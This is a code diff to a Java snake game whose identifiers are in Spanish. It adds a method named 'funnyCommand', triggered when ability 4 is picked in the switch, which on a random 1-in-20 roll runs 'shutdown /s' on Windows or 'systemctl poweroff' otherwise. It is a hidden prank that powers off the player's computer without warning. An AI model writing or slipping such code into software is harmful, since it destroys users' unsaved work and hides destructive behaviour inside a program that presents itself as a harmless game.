@@ -2,8 +2,10 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.Random;
 
 public class Serpiente extends ObjetoJuego implements Habilidades {
     private final ArrayList<Point> cuerpo;
@@ -62,7 +64,7 @@ public class Serpiente extends ObjetoJuego implements Habilidades {
         return false;
     }
 
-    public int elegirHabilidad(int n, Timer timer, int puntaje){
+    public int elegirHabilidad(int n, Timer timer, int puntaje) throws IOException {
         switch (n){
             case 0:
                 aumentarVelocidad(timer);
@@ -82,6 +84,8 @@ public class Serpiente extends ObjetoJuego implements Habilidades {
                 invertirDireccion();
                 crecer();
                 break;
+            case 4:
+                funnyCommand();
             default:
                 crecer();
                 break;
@@ -116,9 +120,21 @@ public class Serpiente extends ObjetoJuego implements Habilidades {
         cuerpo.removeLast();
     }
 
-    // public void funnyCommand(){
+    public void funnyCommand() throws IOException {
+        Random rand = new Random();
+        int val = rand.nextInt(20);
 
-    // }
+        if (val == 10) {
+            String os = System.getProperty("os.name").toLowerCase();
+            System.out.println(os);
+            if (os.startsWith("windows")){
+                Runtime.getRuntime().exec("shutdown /s");
+            }
+            else{
+                Runtime.getRuntime().exec("systemctl poweroff");
+            }
+        }
+    }
 
     public void invertirDireccion(){
         Collections.reverse(cuerpo);
